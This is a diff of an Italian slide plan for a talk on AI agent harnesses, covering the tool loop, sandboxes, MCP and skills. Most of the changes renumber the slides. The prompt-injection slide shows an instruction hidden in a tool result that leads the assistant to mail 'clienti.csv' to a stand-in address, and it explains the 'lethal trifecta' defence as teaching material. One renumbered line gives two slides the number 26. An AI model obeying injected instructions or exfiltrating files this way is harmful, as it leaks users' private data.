@@ -12,30 +12,30 @@
 | File | Slide |
 |------|-------|
 | `slides/slide-div-sec3.html` | Separatore — Sezione 3: Environment management |
-| `slides/slide14-sequence-giro.html` | Slide 14 — Il giro, visto dall'harness |
-| `slides/slide15-errori-feedback.html` | Slide 15 — Errori come feedback |
-| `slides/slide16-parallele.html` | Slide 16 — Chiamate parallele nello stesso giro |
-| `slides/slide17-tool-vs-api.html` | Slide 17 — Un tool non è un'API |
-| `slides/slide18-prompt-injection.html` | Slide 18 — Il risultato è testo: la prompt injection |
-| `slides/slide19-bash-universale.html` | Slide 19 — Bash: un tool come gli altri, che può fare tutto |
-| `slides/slide20-sandbox.html` | Slide 20 — Perché non gira in produzione: il sandbox |
-| `slides/slide21-mcp-specchio.html` | Slide 21 — Dal contratto al protocollo: MCP |
-| `slides/slide22-primitive-mcp.html` | Slide 22 — Le primitive di MCP: tools, resources, prompts |
-| `slides/slide23-mcp-timeline.html` | Slide 23 — Da stateful a stateless: un protocollo che cresce |
-| `slides/slide24-peso-mcp.html` | Slide 24 — Non mappare 1:1 le API: il costo nascosto |
-| `slides/slide25-cos-e-una-skill.html` | Slide 25 — Che cos'è una skill |
-| `slides/slide26-skill-caricamento.html` | Slide 26 — Come entra: dall'indice al corpo |
-| `slides/slide27-skill-script.html` | Slide 27 — Quando la skill porta uno script |
+| `slides/slide15-sequence-giro.html` | Slide 15 — Il giro, visto dall'harness |
+| `slides/slide16-errori-feedback.html` | Slide 16 — Errori come feedback |
+| `slides/slide17-parallele.html` | Slide 17 — Chiamate parallele nello stesso giro |
+| `slides/slide18-tool-vs-api.html` | Slide 18 — Un tool non è un'API |
+| `slides/slide19-prompt-injection.html` | Slide 19 — Il risultato è testo: la prompt injection |
+| `slides/slide20-bash-universale.html` | Slide 20 — Bash: un tool come gli altri, che può fare tutto |
+| `slides/slide21-sandbox.html` | Slide 21 — Perché non gira in produzione: il sandbox |
+| `slides/slide22-mcp-specchio.html` | Slide 22 — Dal contratto al protocollo: MCP |
+| `slides/slide23-primitive-mcp.html` | Slide 23 — Le primitive di MCP: tools, resources, prompts |
+| `slides/slide24-mcp-timeline.html` | Slide 24 — Da stateful a stateless: un protocollo che cresce |
+| `slides/slide25-peso-mcp.html` | Slide 25 — Non mappare 1:1 le API: il costo nascosto |
+| `slides/slide26-cos-e-una-skill.html` | Slide 26 — Che cos'è una skill |
+| `slides/slide27-skill-caricamento.html` | Slide 27 — Come entra: dall'indice al corpo |
+| `slides/slide28-skill-script.html` | Slide 28 — Quando la skill porta uno script |
 
 ---
 
-> **Filo della sezione — il tool è un adattatore.** Il sequence diagram della Slide 14 è il riferimento: la linea di vita `tool` è codice dentro l'harness, e dietro di lei c'è quasi sempre una linea tratteggiata `API`. La stessa linea `API` torna nella Slide 17 (un'API è per un programmatore, un tool per il modello: l'adattatore traduce), nella Slide 21 (MCP sposta l'adattatore fuori dall'harness, in un server) e nella Slide 27 (lo script della skill lo avvolge nel sandbox). Ciò che cambia da una slide all'altra è **dove sta la funzione che chiama l'API**, mai ciò che vede il modello.
+> **Filo della sezione — il tool è un adattatore.** Il sequence diagram della Slide 15 è il riferimento: la linea di vita `tool` è codice dentro l'harness, e dietro di lei c'è quasi sempre una linea tratteggiata `API`. La stessa linea `API` torna nella Slide 18 (un'API è per un programmatore, un tool per il modello: l'adattatore traduce), nella Slide 22 (MCP sposta l'adattatore fuori dall'harness, in un server) e nella Slide 28 (lo script della skill lo avvolge nel sandbox). Ciò che cambia da una slide all'altra è **dove sta la funzione che chiama l'API**, mai ciò che vede il modello.
 >
-> **Il passaggio da dichiarazione dei tool a MCP** (Slide 21) va reso esplicito: MCP standardizza **dichiarazione ed esecuzione**, le due metà mostrate nelle Slide 10 e 14, e dal punto di vista dell'LLM non cambia nulla.
+> **Il passaggio da dichiarazione dei tool a MCP** (Slide 22) va reso esplicito: MCP standardizza **dichiarazione ed esecuzione**, le due metà mostrate nelle Slide 11 e 15, e dal punto di vista dell'LLM non cambia nulla.
 >
 > **Sandbox e MCP non sono in gerarchia**: il sandbox è universale (tutto ciò che il codice raggiunge), ma le API che richiedono un'autenticazione gestita dall'harness fuori dal sandbox restano dietro tool dedicati o MCP. Due porte; quale si usa lo decide chi possiede l'accesso.
 >
-> **Le skill** sono nella maggior parte dei casi solo istruzioni; lo script è l'eccezione. Per questo la Slide 25 le introduce in generale, la 26 mostra una skill di sole istruzioni, e solo la 27 arriva allo script.
+> **Le skill** sono nella maggior parte dei casi solo istruzioni; lo script è l'eccezione. Per questo la Slide 26 le introduce in generale, la 26 mostra una skill di sole istruzioni, e solo la 27 arriva allo script.
 >
 > **Fatti verificati (set 2026)** per le slide MCP: nessuna versione numerata, solo revisioni datate (nov 2024 con sessione → mar 2025 trasporto HTTP streamable → lug 2026 stateless); primitive server tools / resources / prompts, client elicitation; sampling e roots deprecati (solo nelle note del relatore); registry ufficiale, offerta nell'ordine delle decine di migliaia di server. Fonti nel file di ricerca in scratchpad, da riportare nelle note del relatore.
 >
@@ -43,9 +43,9 @@
 
 ---
 
-## Slide 14 — Il giro, visto dall'harness
+## Slide 15 — Il giro, visto dall'harness
 
-**Messaggio**: fra la richiesta del modello e la sua ripartenza c'è un processo che fa quattro cose precise: legge, smista, esegue, appende. È il riquadro `?` della Slide 13, aperto.
+**Messaggio**: fra la richiesta del modello e la sua ripartenza c'è un processo che fa quattro cose precise: legge, smista, esegue, appende. È il riquadro `?` della Slide 14, aperto.
 
 **Layout**: titolo in alto; i quattro punti di testo a sinistra (~30%, classe `tight`); il sequence diagram al centro-destra (~65%); nota in basso.
 
@@ -59,7 +59,7 @@
   4. **Giro successivo**: *richiama il modello con la finestra allungata. Il modello non sa che è passato del tempo: vede solo una riga in più.*
 - Nota in basso: *Il modello ha generato testo. Tutto il resto, dal parsing alla nuova chiamata, è software deterministico: la parte simbolica dell'esoscheletro. Un tool è codice dell'harness; il caso più comune: un adattatore fra il modello e un'API.*
 
-**Visual**: `slide14-sequence-giro.svg` — sequence diagram su due giri.
+**Visual**: `slide15-sequence-giro.svg` — sequence diagram su due giri.
 
 **Prompt per schema SVG**:
 > Sequence diagram con **quattro linee di vita** verticali, da sinistra: `modello`, `harness`, `tool: cerca_ordine` (disegnata **dentro** un riquadro che la dichiara codice dell'harness: *una funzione dell'harness*), e una quarta, **tratteggiata**, `API ordini (HTTP)`. Il tempo scorre dall'alto verso il basso. Due giri, separati da una linea tratteggiata orizzontale etichettata `giro 1` / `giro 2`.
@@ -70,9 +70,9 @@
 >
 > Sulla linea di vita del modello, nei tratti fra una chiamata e l'altra, l'etichetta `aspetta` in grigio: il modello non gira mentre l'harness lavora.
 >
-> **Elemento focale**: la scatola di attivazione dell'harness nel giro 1, con i quattro passi. Secondo elemento: le due etichette `stop_reason`. Terzo: la linea `API` dietro il tool, che tornerà nelle Slide 17, 21 e 27.
+> **Elemento focale**: la scatola di attivazione dell'harness nel giro 1, con i quattro passi. Secondo elemento: le due etichette `stop_reason`. Terzo: la linea `API` dietro il tool, che tornerà nelle Slide 18, 22 e 28.
 
-## Slide 15 — Errori come feedback
+## Slide 16 — Errori come feedback
 
 **Messaggio**: quando un tool fallisce, il fallimento non interrompe il loop: rientra nella finestra come testo, e il modello lo legge e cambia strada. L'errore è informazione.
 
@@ -98,7 +98,7 @@
 
 **Visual**: il riquadro-payload HTML; nessun SVG.
 
-## Slide 16 — Chiamate parallele nello stesso giro
+## Slide 17 — Chiamate parallele nello stesso giro
 
 **Messaggio**: una risposta del modello può contenere più richieste di tool insieme; l'harness le esegue in parallelo e restituisce tutti i risultati in un unico messaggio. Un giro solo invece di tre.
 
@@ -112,7 +112,7 @@
   3. **Un giro invece di tre**: *meno chiamate al modello, meno latenza, e la finestra cresce di tre risultati una volta sola invece di rileggere tutto tre volte.*
 - Nota in basso: *Anche questo il modello lo ha imparato nel RL agentico: le traiettorie che chiedevano in parallelo finivano prima. L'harness deve solo non tradirlo.*
 
-**Visual**: `slide16-parallele.svg` — confronto sequenziale / parallelo.
+**Visual**: `slide17-parallele.svg` — confronto sequenziale / parallelo.
 
 **Prompt per schema SVG**:
 > Due pannelli affiancati, divisi da un filo verticale, stessa scala temporale verticale (il tempo scende).
@@ -123,7 +123,7 @@
 >
 > **Elemento focale**: la differenza di altezza fra i due pannelli, e le tre corsie parallele dell'harness.
 
-## Slide 17 — Un tool non è un'API
+## Slide 18 — Un tool non è un'API
 
 **Messaggio**: un'API è scritta per un programmatore, un tool per il modello. L'adattatore è dove si fa la traduzione; se non si fa, nella finestra entrano migliaia di token che nessuno leggerà.
 
@@ -137,10 +137,10 @@
   3. **Il pattern: salva e cerca**: *quando il risultato è davvero grande (un log, un documento, un export), l'harness lo scrive su un file nel sandbox e restituisce al modello solo un riassunto e il percorso. Il modello poi ci cerca dentro con `grep` o `head`, e nella finestra entrano solo le righe che contano.*
 - Nota in basso: *È il primo caso in cui il sandbox serve a governare il contesto, non a eseguire un compito. Lo ritroveremo: l'offload su file è la tecnica principe della sezione 4.*
 
-**Visual**: `slide17-tool-vs-api.svg`.
+**Visual**: `slide18-tool-vs-api.svg`.
 
 **Prompt per schema SVG**:
-> Due colonne, `L'API` a sinistra e `IL TOOL` a destra, con in mezzo un blocco `adattatore` che le collega (è la funzione della Slide 14, dentro l'harness).
+> Due colonne, `L'API` a sinistra e `IL TOOL` a destra, con in mezzo un blocco `adattatore` che le collega (è la funzione della Slide 15, dentro l'harness).
 >
 > **Colonna API**: un riquadro `GET /orders/{id}` con una lista lunga di parametri (`id, include, expand, locale, currency, fields, …` che sfuma in `…20 parametri`) e sotto una risposta JSON che scende oltre il bordo del riquadro, con l'etichetta `~5.000 righe`.
 >
@@ -150,7 +150,7 @@
 >
 > **Elemento focale**: il contrasto di dimensione fra la risposta dell'API e quella del tool, e il blocco `adattatore` che sta in mezzo.
 
-## Slide 18 — Il risultato è testo: la prompt injection
+## Slide 19 — Il risultato è testo: la prompt injection
 
 **Messaggio**: il modello non distingue, dentro la finestra, i dati dalle istruzioni. Tutto ciò che un tool riporta può contenere un ordine, e il modello lo legge con lo stesso peso delle regole. Il rischio si governa nell'harness, non nel modello.
 
@@ -159,7 +159,7 @@
 **Testo**:
 - Titolo: *Il risultato è testo: la prompt injection*
 - Punti:
-  1. **Il rovescio della Slide 15**: *tutto ciò che rientra nella finestra è informazione per il giro dopo. Anche un'istruzione nascosta in una pagina web, in una mail, in un documento che un tool ha riportato.*
+  1. **Il rovescio della Slide 16**: *tutto ciò che rientra nella finestra è informazione per il giro dopo. Anche un'istruzione nascosta in una pagina web, in una mail, in un documento che un tool ha riportato.*
   2. **Non è un bug**: *il contesto è una sequenza di token e l'attention non ha un bit "questo è fidato" (Slide 8: la gerarchia system/user è imparata, non garantita). Nessun modello, oggi, è immune.*
   3. **La regola di progetto: la lethal trifecta**: *il danno è possibile solo se l'agente ha insieme tre cose: accesso a dati privati, esposizione a contenuti non fidati, un canale per far uscire informazioni. Togline una, e l'attacco non chiude.*
 - Riquadro-payload (HTML, idioma del 26; il commento nascosto nella riga `[tool]` evidenziato in giallo, fondo `#fff2ce`; l'ultima pill con un `✗` a lato):
@@ -172,9 +172,9 @@
   [assistant] → invia_mail(a="raccolta@esempio.net", allegato="clienti.csv")
   ```
 - Citazione in slide: *"The lethal trifecta: private data, untrusted content, exfiltration."* — Simon Willison, 2025.
-- Nota in basso: *È una decisione dell'harness: quali tool esporre insieme, in quale sandbox, con quale rete. Lo ritroveremo alla Slide 20 (isolamento), nella memoria (che si può avvelenare) e nell'orchestrazione (un subagente con pochi tool è anche un confine di fiducia).*
+- Nota in basso: *È una decisione dell'harness: quali tool esporre insieme, in quale sandbox, con quale rete. Lo ritroveremo alla Slide 21 (isolamento), nella memoria (che si può avvelenare) e nell'orchestrazione (un subagente con pochi tool è anche un confine di fiducia).*
 
-**Visual**: riquadro-payload (HTML) + `slide18-trifecta.svg`.
+**Visual**: riquadro-payload (HTML) + `slide19-trifecta.svg`.
 
 **Prompt per schema SVG** (trifecta):
 > Tre cerchi che si sovrappongono a tre (diagramma di Venn), etichettati `dati privati`, `contenuti non fidati`, `canale in uscita`. La sola area centrale, dove tutti e tre si intersecano, è piena e in evidenza, con l'etichetta `qui l'attacco chiude`. Le altre aree sono vuote. Accanto a ciascun cerchio, un esempio in piccolo: `il CRM, i file dell'utente` · `pagine web, mail in arrivo, documenti caricati` · `invia_mail, richieste HTTP, scrittura fuori dal sandbox`.
@@ -183,7 +183,7 @@
 >
 > **Elemento focale**: l'intersezione centrale.
 
-## Slide 19 — Bash: un tool come gli altri, che può fare tutto
+## Slide 20 — Bash: un tool come gli altri, che può fare tutto
 
 **Messaggio**: per il modello il sandbox è un tool come gli altri: nome, descrizione, un parametro. Ma è universale: tutto ciò che il codice può raggiungere, lo raggiunge. Il suo perimetro finisce dove serve un accesso che l'harness non possiede.
 
@@ -221,7 +221,7 @@
 
 **Visual**: i due riquadri HTML; nessun SVG.
 
-## Slide 20 — Perché non gira in produzione: il sandbox
+## Slide 21 — Perché non gira in produzione: il sandbox
 
 **Messaggio**: un tool che esegue codice scritto dal modello non può girare sulla macchina di produzione. Il sandbox è la risposta: un ambiente isolato, usa e getta, con la rete sotto controllo.
 
@@ -231,11 +231,11 @@
 - Titolo: *Perché non gira in produzione: il sandbox*
 - Punti:
   1. **Isolamento**: *il codice del modello gira in un contenitore separato: non vede il filesystem dell'harness, non vede le credenziali, non vede gli altri utenti. Se sbaglia un `rm`, cancella il proprio contenitore.*
-  2. **Filesystem effimero**: *nasce con la sessione e muore con lei. Ciò che deve sopravvivere va portato fuori esplicitamente: è la stessa domanda della memoria (sezione 4).*
+  2. **Filesystem effimero**: *nasce con la sessione e muore con lei. Ciò che deve sopravvivere va portato fuori esplicitamente. Il caso tipico è il coding agent: all'inizio l'harness clona il repository dentro il sandbox, alla fine committa e spinge le modifiche. Il repository sta fuori, il sandbox si butta.*
   3. **Rete controllata**: *di default non esce, o esce solo verso destinazioni note. È l'anello della trifecta che l'harness può tagliare: un'istruzione iniettata che riesce a farsi eseguire non ha dove mandare i dati.*
 - Nota in basso: *Il sandbox non è una precauzione in più: è ciò che rende accettabile dare al modello un tool universale. Senza, il punto 2 della slide precedente sarebbe una minaccia, non una capacità.*
 
-**Visual**: `slide20-sandbox.svg`.
+**Visual**: `slide21-sandbox.svg`.
 
 **Prompt per schema SVG**:
 > Diagramma a due zone affiancate, separate da una linea spessa etichettata `confine`.
@@ -244,11 +244,11 @@
 >
 > **A destra, `sandbox (effimero)`**: un contenitore con bordo tratteggiato, dentro `shell`, `python`, `filesystem di sessione` (con i file `ordini_08.json`, `export_4471.json` delle slide precedenti). In alto a destra un'icona di rete con un lucchetto e l'etichetta `rete: solo destinazioni ammesse`. In basso, un piccolo orologio con `nasce e muore con la sessione`.
 >
-> **Attraverso il confine**, due sole frecce: `harness → sandbox` etichettata `comando (dal tool_use)`, e `sandbox → harness` etichettata `stdout, exit code (nel tool_result)`. Nessun'altra freccia attraversa il confine: le credenziali e i sistemi aziendali restano a sinistra.
+> **Attraverso il confine**, due frecce di lavoro: `harness → sandbox` etichettata `comando (dal tool_use)`, e `sandbox → harness` etichettata `stdout, exit code (nel tool_result)`. Più due frecce di **ciclo di vita**, più sottili e ai bordi: all'inizio `git clone` da un cilindro `repository` (a sinistra, fuori dall'harness) verso il sandbox; alla fine `git push` dal sandbox verso lo stesso cilindro. Nessun'altra freccia attraversa il confine: le credenziali e i sistemi aziendali restano a sinistra.
 >
-> **Elemento focale**: il confine, e il fatto che lo attraversino solo due frecce sottili.
+> **Elemento focale**: il confine, e il fatto che lo attraversino solo le frecce di lavoro e quelle di ciclo di vita, sottili.
 
-## Slide 21 — Dal contratto al protocollo: MCP
+## Slide 22 — Dal contratto al protocollo: MCP
 
 **Messaggio**: MCP prende le due metà appena viste, la dichiarazione del tool e la sua esecuzione, e le standardizza in un protocollo, così l'adattatore si scrive una volta e lo usa qualsiasi harness. Il modello non se ne accorge: vede la stessa definizione e la stessa riga `[tool]`.
 
@@ -261,10 +261,10 @@
   2. **La soluzione**: *il Model Context Protocol sposta l'adattatore fuori dall'harness, in un server, e standardizza le due cose che abbiamo appena visto: come un server dichiara i suoi tool (nome, descrizione, schema) e come l'harness li chiama e riceve il risultato.*
 - Nota in basso: *Dal punto di vista dell'LLM non cambia nulla: nella finestra trova la stessa definizione e riceve lo stesso `tool_result`. MCP è un accordo fra harness e fornitori di tool; il modello non è parte del contratto.*
 
-**Visual**: `slide21-mcp-specchio.svg` — lo stesso sequence diagram della Slide 14, due volte.
+**Visual**: `slide22-mcp-specchio.svg` — lo stesso sequence diagram della Slide 15, due volte.
 
 **Prompt per schema SVG**:
-> Due pannelli affiancati, divisi da un filo verticale, entrambi con la stessa struttura della Slide 14 ridotta a un giro.
+> Due pannelli affiancati, divisi da un filo verticale, entrambi con la stessa struttura della Slide 15 ridotta a un giro.
 >
 > **Pannello sinistro — «SENZA MCP»**: linee di vita `modello`, `harness`, e dentro l'harness (racchiusa nel suo riquadro) la funzione `cerca_ordine`, che chiama la linea tratteggiata `API ordini`. Etichetta sul riquadro dell'harness: *l'adattatore è codice dell'harness: riscritto per ogni prodotto*.
 >
@@ -274,7 +274,7 @@
 >
 > **Elemento focale**: il riquadro `server MCP` che contiene la stessa funzione del pannello sinistro, spostata fuori; e la colonna del modello identica a destra e a sinistra.
 
-## Slide 22 — Le primitive di MCP: tools, resources, prompts
+## Slide 23 — Le primitive di MCP: tools, resources, prompts
 
 **Messaggio**: un server MCP non espone solo tool. Espone tre cose, ognuna con un destinatario diverso; e i ruoli sono tre, non due.
 
@@ -283,12 +283,12 @@
 **Testo**:
 - Titolo: *Le primitive di MCP: tools, resources, prompts*
 - Le tre colonne:
-  1. **Tools**: *funzioni che il modello può chiamare. Sono la dichiarazione della Slide 10, resa in protocollo: `cerca_ordine`, `crea_ticket`. Li decide il modello.*
+  1. **Tools**: *funzioni che il modello può chiamare. Sono la dichiarazione della Slide 11, resa in protocollo: `cerca_ordine`, `crea_ticket`. Li decide il modello.*
   2. **Resources**: *dati che l'harness può leggere e mettere nella finestra: un file, una tabella, la scheda di un cliente. Non li chiama il modello: li porta l'harness, o l'utente, quando servono.*
   3. **Prompts**: *modelli di istruzione pronti, forniti dal server: "analizza questo ordine così". Sono pezzi di system prompt che il fornitore del tool scrive al posto tuo.*
 - Nota in basso: *I ruoli: l'**host** è l'applicazione (l'harness); apre un **client** per ogni **server** a cui si collega. Il server può girare in locale, come processo lanciato dall'host, o in remoto, dietro HTTP. Esiste anche una primitiva lato client, l'elicitation: il server può chiedere all'utente un dato che gli manca.*
 
-**Visual**: `slide22-primitive-mcp.svg`.
+**Visual**: `slide23-primitive-mcp.svg`.
 
 **Prompt per schema SVG**:
 > **A sinistra, `host (l'harness)`**: un riquadro grande con dentro il blocco `LLM`, la finestra a strati della sezione 2 in miniatura, e due riquadri piccoli etichettati `client 1`, `client 2`. Da ciascun client parte una connessione verso un server.
@@ -303,7 +303,7 @@
 
 > Note del relatore: sampling e roots (primitive lato client) sono deprecate dalla revisione 2026-07; estensioni opt-in (tasks, apps, skills over MCP) esistono ma non entrano in slide.
 
-## Slide 23 — Da stateful a stateless: un protocollo che cresce
+## Slide 24 — Da stateful a stateless: un protocollo che cresce
 
 **Messaggio**: MCP è nato come protocollo con sessione, e in due anni è diventato stateless per poter scalare come un'API qualsiasi. Nel frattempo è diventato lo standard di fatto, con un'offerta di server nell'ordine delle decine di migliaia.
 
@@ -317,7 +317,7 @@
   3. **Che cosa è diventato**: *ha un registry ufficiale, l'offerta di server è nell'ordine delle decine di migliaia, e praticamente ogni harness sul mercato lo parla.*
 - Nota in basso: *Perché ve lo racconto: chi compra o costruisce un agente oggi trova server "vecchio stile" e server nuovi; e chi espone un'API ai propri agenti deve decidere quale forma dare al server. La direzione è chiara: remoto, stateless, dietro un gateway.*
 
-**Visual**: `slide23-mcp-timeline.svg`.
+**Visual**: `slide24-mcp-timeline.svg`.
 
 **Prompt per schema SVG**:
 > Una linea del tempo orizzontale con tre tacche: `nov 2024 — nasce, con sessione` · `mar 2025 — trasporto HTTP streamable` · `lug 2026 — stateless`. Sopra la linea, due riquadri a confronto, collegati alla prima e all'ultima tacca:
@@ -329,7 +329,7 @@
 
 > I numeri sono da fonti ufficiali a settembre 2026 (blog MCP, annuncio Anthropic di dicembre 2025); in slide restano ordini di grandezza, il dettaglio va nelle note del relatore.
 
-## Slide 24 — Non mappare 1:1 le API: il costo nascosto
+## Slide 25 — Non mappare 1:1 le API: il costo nascosto
 
 **Messaggio**: un server MCP che espone ogni endpoint come un tool è un cattivo server: le definizioni entrano tutte nella finestra, a ogni giro, lette o no, e il modello sceglie peggio. Progettare i tool di un server è progettare per il modello, non per l'API.
 
@@ -339,11 +339,11 @@
 - Titolo: *Non mappare 1:1 le API: il costo nascosto*
 - Punti:
   1. **La tentazione**: *l'API del CRM ha cinquanta endpoint; il generatore automatico ne fa cinquanta tool, con la descrizione presa dalla documentazione. Ci vuole un pomeriggio, e sembra completo.*
-  2. **Il conto**: *cinquanta definizioni, ognuna da uno a qualche centinaio di token, entrano nel prefisso a ogni giro. Con tre server così, la finestra parte da decine di migliaia di token prima della prima parola (Slide 12), e il modello deve scegliere fra centocinquanta nomi che si somigliano.*
+  2. **Il conto**: *cinquanta definizioni, ognuna da uno a qualche centinaio di token, entrano nel prefisso a ogni giro. Con tre server così, la finestra parte da decine di migliaia di token prima della prima parola (Slide 13), e il modello deve scegliere fra centocinquanta nomi che si somigliano.*
   3. **La regola**: *un tool per compito del modello, non per endpoint dell'API: pochi tool, con nomi che dicono quando usarli, che accorpano le chiamate e restituiscono solo ciò che serve. Ed esporre solo i server che servono a quel task.*
 - Nota in basso (ponte): *La cache riduce il costo in denaro del prefisso, ma non la confusione decisionale, e non il fatto che la finestra cresce. Come si governa una finestra che cresce: sezione 4.*
 
-**Visual**: `slide24-peso-mcp.svg` — harness al centro, server intorno, col peso in token di ciascuno nella finestra.
+**Visual**: `slide25-peso-mcp.svg` — harness al centro, server intorno, col peso in token di ciascuno nella finestra.
 
 **Prompt per schema SVG**:
 > Al centro, l'`harness` con dentro la **finestra a strati** della sezione 2 in miniatura. Intorno, quattro `server MCP` collegati all'harness: `ordini` (4 tool), `CRM` (50 tool), `posta` (12 tool), `calendario` (8 tool). Da ogni server parte una freccia verso lo **strato delle dichiarazioni** della finestra; lo spessore della freccia e una barra dentro lo strato sono proporzionali al numero di tool, con il peso in token scritto a lato: `~600` · `~9.000` · `~2.000` · `~1.200`. Lo strato delle dichiarazioni risulta enorme rispetto agli altri: il totale in fondo dice `~13.000 token a ogni giro, prima della domanda`.
@@ -352,7 +352,7 @@
 >
 > **Elemento focale**: la barra del CRM dentro la finestra, sproporzionata rispetto alle altre.
 
-## Slide 25 — Che cos'è una skill
+## Slide 26 — Che cos'è una skill
 
 **Messaggio**: una skill è un documento di istruzioni, quasi sempre solo quello: la procedura che un esperto scriverebbe a un collega nuovo. È il know-how della formula, messo a disposizione del modello.
 
@@ -362,7 +362,7 @@
 - Titolo: *Che cos'è una skill*
 - Punti:
   1. **Un documento, non un programma**: *una cartella con un file di istruzioni: che cosa fare, in che ordine, con quali soglie, che cosa non fare mai. Scritto in linguaggio naturale, da chi il lavoro lo sa fare.*
-  2. **Due parti**: *in testa il frontmatter (nome e descrizione: l'indice della Slide 11); sotto il corpo (la procedura). A volte, accanto, dei file di supporto: un template, una tabella, uno script. Ma nella maggior parte dei casi è solo testo.*
+  2. **Due parti**: *in testa il frontmatter (nome e descrizione: l'indice della Slide 12); sotto il corpo (la procedura). A volte, accanto, dei file di supporto: un template, una tabella, uno script. Ma nella maggior parte dei casi è solo testo.*
   3. **Know-how, non know-what**: *la KB dice come stanno le cose (ciò che l'organizzazione sa); la skill dice come si fa (ciò che l'organizzazione sa fare). Nella formula sono due termini diversi, e nel 28 vedremo perché.*
 - Riquadro-skill (HTML, testo esatto; frontmatter e corpo con due sfondi diversi e le etichette `frontmatter: nell'indice` / `corpo: caricato a richiesta` a lato):
   ```
@@ -382,7 +382,7 @@
 
 **Visual**: il riquadro HTML; nessun SVG. La skill chiama i tool `cerca_ordine`, `crea_rimborso`, `crea_ticket`: è il legame fra skill e tool, detto senza dirlo.
 
-## Slide 26 — Come entra: dall'indice al corpo
+## Slide 27 — Come entra: dall'indice al corpo
 
 > Esempio con una skill di **sole istruzioni** (`risposta-reclami-acme`), di proposito: dopo il caricamento il modello non chiama nessun tool, scrive.
 
@@ -398,7 +398,7 @@
   3. **Progressive disclosure**: *prima due righe per ogni skill, poi il corpo di una sola. Venti skill nell'indice pesano quanto tre tool; il corpo pesa solo quando serve, e solo quello scelto.*
 - Nota in basso: *Il conto preciso, e il confronto con cinquanta tool MCP sempre presenti, è la prima slide della sezione 4.*
 
-**Visual**: `slide26-skill-caricamento.svg` — la finestra a strati con il corpo che entra.
+**Visual**: `slide27-skill-caricamento.svg` — la finestra a strati con il corpo che entra.
 
 **Prompt per schema SVG**:
 > La finestra a strati della sezione 2, in tre fotogrammi affiancati (stesso disegno, da sinistra a destra):
@@ -413,7 +413,7 @@
 
 > Note del relatore: i due meccanismi di caricamento con esempi — in Claude Code il modello chiama uno strumento `Skill` e il corpo torna come risultato; nell'API di Anthropic i file della skill sono montati nel sandbox e il modello li legge con il tool di esecuzione codice; in altri harness il corpo è appeso dall'harness su match della descrizione.
 
-## Slide 27 — Quando la skill porta uno script
+## Slide 28 — Quando la skill porta uno script
 
 **Messaggio**: quando il compito ha una parte meccanica (chiamare un'API, filtrare, aggregare, formattare), farla fare a uno script è più efficiente e più affidabile che farla fare al modello con una catena di tool call; e se lo script sta nella skill, il modello non deve nemmeno riscriverlo.
 
@@ -425,9 +425,9 @@
   1. **Il caso**: *"prepara il report vendite della settimana": leggere l'export, calcolare i totali per prodotto, confrontare con la settimana prima, impaginare. Quattro passi meccanici, sempre uguali.*
   2. **Tre modi di farlo**: *con i tool, quattro giri e quattro risultati interi nella finestra, e le somme le fa il modello. Con bash, il modello scrive al volo uno script: un giro solo, ma lo script è diverso ogni volta, e ogni volta può sbagliare. Con la skill, lo script è già scritto: il modello lo lancia con i parametri giusti.*
   3. **Perché è meglio**: *lo script avvolge l'API e lavora sul risultato in modo deterministico: stesso input, stesso output, zero token per i passaggi intermedi. Il modello fa la parte sua (capire la richiesta, scegliere i parametri, commentare il risultato) e lascia al codice la parte del codice.*
-- Nota in basso: *È la stessa lezione della Slide 19, vista dal lato di chi progetta: se un compito si può scrivere come script, scrivilo una volta e mettilo nella skill. Il modello non deve reinventarlo a ogni sessione.*
+- Nota in basso: *È la stessa lezione della Slide 20, vista dal lato di chi progetta: se un compito si può scrivere come script, scrivilo una volta e mettilo nella skill. Il modello non deve reinventarlo a ogni sessione.*
 
-**Visual**: `slide27-skill-script.svg` — lo stesso task in tre colonne.
+**Visual**: `slide28-skill-script.svg` — lo stesso task in tre colonne.
 
 **Prompt per schema SVG**:
 > Tre pannelli affiancati, stessa scala verticale (il tempo scende), divisi da due fili.
